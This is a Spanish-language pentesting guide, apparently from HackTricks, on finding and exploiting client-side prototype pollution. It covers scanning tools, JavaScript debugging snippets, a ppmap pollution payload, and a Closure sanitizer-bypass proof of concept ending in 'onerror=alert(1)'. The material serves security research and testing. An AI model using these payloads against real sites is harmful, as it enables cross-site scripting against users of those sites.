# Contaminación de Prototipos del Lado del Cliente

{{#include ../../../banners/hacktricks-training.md}}

## Descubrimiento usando herramientas automáticas

Las herramientas [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **y** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) se pueden usar para **encontrar vulnerabilidades de contaminación de prototipos**.

Además, también podrías usar la **extensión del navegador** [**PPScan**](https://github.com/msrkp/PPScan) para **escanear automáticamente** las **páginas** que **accedes** en busca de vulnerabilidades de contaminación de prototipos.

### Depuración de dónde se usa una propiedad <a href="#id-5530" id="id-5530"></a>
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype, "potentialGadget", {
__proto__: null,
get() {
console.trace()
return "test"
},
})
```
### Encontrar la causa raíz de la contaminación del prototipo <a href="#id-5530" id="id-5530"></a>

Una vez que se ha identificado una vulnerabilidad de contaminación del prototipo mediante cualquiera de las herramientas, y si el código no es demasiado complejo, puedes encontrar la vulnerabilidad buscando palabras clave como `location.hash`, `decodeURIComponent` o `location.search` en las Herramientas de Desarrollo de Chrome. Este enfoque te permite localizar la sección vulnerable del código JavaScript.

Para bases de código más grandes y complejas, un método sencillo para descubrir el código vulnerable implica los siguientes pasos:

1. Usa una herramienta para identificar una vulnerabilidad y obtener una carga útil diseñada para establecer una propiedad en el constructor. Un ejemplo proporcionado por ppmap podría verse así: `constructor[prototype][ppmap]=reserved`.
2. Establece un punto de interrupción en la primera línea de código JavaScript que se ejecutará en la página. Actualiza la página con la carga útil, pausando la ejecución en este punto de interrupción.
3. Mientras la ejecución de JavaScript está en pausa, ejecuta el siguiente script en la consola de JS. Este script señalará cuándo se crea la propiedad 'ppmap', ayudando a localizar su origen:
```javascript
function debugAccess(obj, prop, debugGet = true) {
var origValue = obj[prop]

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet) debugger
return origValue
},
set: function (val) {
debugger
origValue = val
},
})
}

debugAccess(Object.prototype, "ppmap")
```
4. Navega de vuelta a la pestaña **Sources** y selecciona “Resume script execution”. El JavaScript continuará ejecutándose, y la propiedad 'ppmap' se contaminará como se esperaba. Utilizar el fragmento proporcionado facilita la identificación de la ubicación exacta donde se contamina la propiedad 'ppmap'. Al examinar la **Call Stack**, se pueden observar diferentes pilas donde ocurrió la contaminación.

Al decidir qué pila investigar, a menudo es útil dirigirse a pilas asociadas con archivos de bibliotecas de JavaScript, ya que la contaminación del prototipo ocurre con frecuencia dentro de estas bibliotecas. Identifica la pila relevante examinando su conexión con archivos de biblioteca (visible en el lado derecho, similar a una imagen proporcionada como guía). En escenarios con múltiples pilas, como las de las líneas 4 y 6, la elección lógica es la pila de la línea 4, ya que representa la primera ocurrencia de contaminación y, por lo tanto, la causa raíz de la vulnerabilidad. Hacer clic en la pila te llevará al código vulnerable.

![https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Encontrando Gadgets de Script

El gadget es el **código que será abusado una vez que se descubra una vulnerabilidad de PP**.

Si la aplicación es simple, podemos **buscar** **palabras clave** como **`srcdoc/innerHTML/iframe/createElement`** y revisar el código fuente y verificar si **conduce a la ejecución de javascript**. A veces, las técnicas mencionadas pueden no encontrar gadgets en absoluto. En ese caso, la revisión pura del código fuente revela algunos buenos gadgets como el siguiente ejemplo.

### Ejemplo de encontrar gadget de PP en el código de la biblioteca Mithil

Consulta este informe: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Recompilación de payloads para bibliotecas vulnerables

- [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
- [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## Bypass de sanitizadores HTML a través de PP

[**Esta investigación**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) muestra gadgets de PP para usar para **eludir las sanitizaciones** proporcionadas por algunas bibliotecas de sanitizadores HTML:

- **sanitize-html**

<figure><img src="../../../images/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

- **dompurify**

<figure><img src="../../../images/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

- **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Referencias

- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

{{#include ../../../banners/hacktricks-training.md}}
